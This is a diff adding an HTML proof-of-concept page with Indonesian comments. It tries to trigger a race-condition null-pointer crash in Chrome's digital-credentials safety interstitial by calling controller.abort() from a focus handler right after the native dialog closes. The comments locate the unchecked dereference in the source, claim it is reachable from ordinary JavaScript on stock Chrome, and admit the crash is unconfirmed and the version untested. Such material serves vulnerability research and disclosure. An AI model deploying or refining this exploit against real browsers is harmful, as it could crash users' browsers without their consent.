@@ -1,0 +1,94 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>DC Interstitial Abort Null-Deref PoC</title></head>
+<body style="font-family:sans-serif;max-width:640px;margin:40px auto;">
+<h1 id="status">ready</h1>
+<p>
+  1. Klik <b>START</b> (ini gesture asli yang dibutuhkan <code>navigator.credentials.get()</code>).<br>
+  2. Tunggu dialog interstitial native "share your identity with this site?" muncul.<br>
+  3. Klik SENDIRI tombol <b>"Go back"</b> di dialog itu (atau tekan <b>Esc</b>) &mdash; close asli, bukan scripted.<br>
+  4. Kalau belum crash, klik START lagi dan ulangi dari langkah 2.
+</p>
+<button id="go" style="font-size:32px;padding:20px 40px;">START</button>
+<pre id="log" style="white-space:pre-wrap;font-size:12px;background:#111;color:#0f0;padding:10px;height:200px;overflow:auto;"></pre>
+<script>
+// Potential null-pointer-dereference PoC untuk:
+//   DigitalIdentitySafetyInterstitialControllerDesktop::Abort()
+//   chrome/browser/ui/views/digital_credentials/digital_identity_safety_interstitial_controller_desktop.cc
+//
+// Abort() men-dereference dialog_widget_ tanpa cek null:
+//
+//   void DigitalIdentitySafetyInterstitialControllerDesktop::Abort() {
+//     if (!web_contents_) { return; }
+//     dialog_widget_->CloseWithReason(...);   // <-- tidak ada null check
+//     ShowInterstitialImpl(/*was_request_aborted=*/true);
+//   }
+//
+// dialog_widget_ di-set nullptr SECARA SINKRON oleh OnDialogClosed() (handler
+// klik tombol), sementara objek controller-nya baru benar-benar di-destroy
+// lewat task yang di-POST dari OnDialogClosed() (komentar di source: "Run
+// async to ensure it's impossible to tear down the controller while our
+// caller may still be using it."). Di celah antara dua kejadian itu,
+// memanggil Abort() men-dereference dialog_widget_ yang null -> crash.
+//
+// DigitalIdentityRequestImpl::Abort() (content/browser/digital_credentials/
+// digital_identity_request_impl.cc) adalah method Mojo langsung yang dipicu
+// saat AbortController halaman ini memanggil .abort() -- JS biasa, tanpa
+// kompromi renderer, tanpa build custom. features::kWebIdentityDigitalCredentials
+// adalah FEATURE_ENABLED_BY_DEFAULT, jadi ini hidup di Chrome stok/tidak dimodifikasi.
+//
+// BELUM terkonfirmasi crash. Versi blind-delay (location.replace() + abort()
+// ditembak berurutan setelah setTimeout tebakan) sudah dicoba ~10 kali,
+// variasi delay 10-900ms dan urutan tembak, nol crash -- location.replace()
+// TIDAK menutup dialog modal secara SINKRON, jadi abort() yang di-script
+// nyaris tidak pernah mendarat di celah sempit yang sebenarnya.
+//
+// Versi ini sebaliknya memicu race lewat event `focus` halaman sendiri.
+// Dialog tab-modal mengambil fokus input dari halaman selama terbuka; saat
+// dialog native benar-benar selesai tertutup (karena apa pun -- klik tombol
+// asli, Escape, dll) fokus kembali ke halaman, memicu `window.onfocus` di
+// renderer. Ini sinyal event-driven yang jauh lebih presisi untuk "dialog
+// baru saja selesai tertutup" dibanding delay setTimeout tetap, jadi
+// menembak controller.abort() dari dalam handler focus memberi pesan Mojo
+// Abort() peluang realistis mendarat di celah sempit pasca-close itu --
+// tapi ini masih bergantung detail penjadwalan Mojo/task yang belum
+// terverifikasi di sini. Belum pernah dicoba live.
+
+function log(msg) {
+  const el = document.getElementById('log');
+  el.textContent += new Date().toISOString().slice(11, 23) + '  ' + msg + '\n';
+  el.scrollTop = el.scrollHeight;
+}
+
+
+function startAttempt() {
+  controller = new AbortController();
+  armed = true;
+  log('request started -- klik "Go back" (atau tekan Esc) di dialog sekarang');
+  navigator.credentials.get({
+    digital: {
+      requests: [{
+        protocol: 'dc-abort-race-poc-protocol',
+        data: { probe: true }
+      }]
+    },
+    signal: controller.signal
+  }).then(() => log('request resolved'))
+    .catch((e) => log('request settled: ' + e.name));
+}
+
+window.addEventListener('focus', () => {
+  if (!armed || !controller) return;
+  armed = false;
+  log('focus kembali ke halaman -- menembak abort() sekarang');
+  try {
+    controller.abort();
+  } catch (e) {
+    log('abort() throw: ' + e);
+  }
+});
+
+document.getElementById('go').addEventListener('click', startAttempt);
+</script>
+</body>
+</html>
